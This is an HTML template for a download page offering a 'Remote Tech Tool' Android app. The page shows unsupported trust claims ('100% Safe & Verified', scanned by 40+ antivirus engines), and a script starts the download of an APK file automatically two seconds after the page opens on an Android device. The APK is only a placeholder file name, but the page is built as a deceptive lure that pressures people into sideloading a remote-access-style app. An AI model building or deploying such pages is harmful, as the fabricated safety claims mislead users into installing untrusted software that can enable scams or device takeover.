<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Download | Official Release</title>
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .download-card {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }
        .icon {
            font-size: 50px;
            margin-bottom: 10px;
            text-shadow: 0 0 15px rgba(88, 166, 255, 0.4);
        }
        h2 {
            color: #ffffff;
            margin: 0 0 5px 0;
            font-size: 1.8rem;
            font-weight: 600;
        }
        .meta-info {
            color: #8b949e;
            font-size: 0.9rem;
            margin-bottom: 25px;
        }
        .primary-badge {
            display: inline-block;
            background-color: rgba(35, 134, 54, 0.15);
            color: #3fb950;
            border: 1px solid #2ea043;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 30px;
            letter-spacing: 0.5px;
        }
        .trust-features {
            display: flex;
            flex-direction: column;
            gap: 12px;
            text-align: left;
            background-color: #0d1117;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #21262d;
            margin-top: 10px;
        }
        .trust-item {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.9rem;
            color: #e6edf3;
        }
        .trust-item i {
            font-size: 1.1rem;
        }
        .status-text {
            color: #8b949e;
            font-size: 0.9rem;
            margin-top: 25px;
            font-weight: 500;
        }
        .manual-link {
            display: none; /* शुरुआत में छुपा रहेगा */
            margin-top: 15px;
            color: #58a6ff;
            text-decoration: none;
            font-size: 0.9rem;
            font-weight: 500;
        }
        .manual-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="download-card">
        <div class="icon">🛡️</div>
        <h2>Remote Tech Tool</h2>
        <div class="meta-info">Version 1.0.2 &bull; 15 MB &bull; Android Only</div>
        
        <div class="primary-badge">✓ 100% Safe & Verified</div>
        
        <div class="trust-features">
            <div class="trust-item">
                <i>✅</i> <span><b>Malware Free:</b> Scanned by 40+ Antivirus engines</span>
            </div>
            <div class="trust-item">
                <i>🔒</i> <span><b>Secure Connection:</b> 256-bit SSL Encrypted</span>
            </div>
            <div class="trust-item">
                <i>⚡</i> <span><b>Fast Download:</b> Direct from secure servers</span>
            </div>
        </div>

        <p id="status-message" class="status-text">Checking device compatibility...</p>
        <a href="dummy_app.apk" id="manual-download" class="manual-link">Click here to download manually</a>
    </div>

    <script>
        function checkDeviceAndDownload() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            var statusMessage = document.getElementById("status-message");
            var manualLink = document.getElementById("manual-download");

            // सिर्फ Android के लिए चेक
            if (/android/i.test(userAgent)) {
                statusMessage.innerHTML = "Your secure download will start in 2 seconds...";
                statusMessage.style.color = "#8b949e"; 
                manualLink.style.display = "inline-block"; // मैनुअल लिंक दिखाएं
                
                // 2 सेकंड बाद डाउनलोड शुरू
                setTimeout(function() {
                    window.location.href = "dummy_app.apk"; 
                }, 2000);
            } else {
                // अगर Android नहीं है (Windows, Linux, iOS)
                statusMessage.innerHTML = "❌ This app is only available for Android devices.";
                statusMessage.style.color = "#f85149"; // लाल रंग का अलर्ट
                // डाउनलोड लिंक छुपा ही रहेगा
            }
        }

        // पेज खुलने के तुरंत बाद यह चेक करेगा
        setTimeout(checkDeviceAndDownload, 500);
    </script>

</body>
</html>
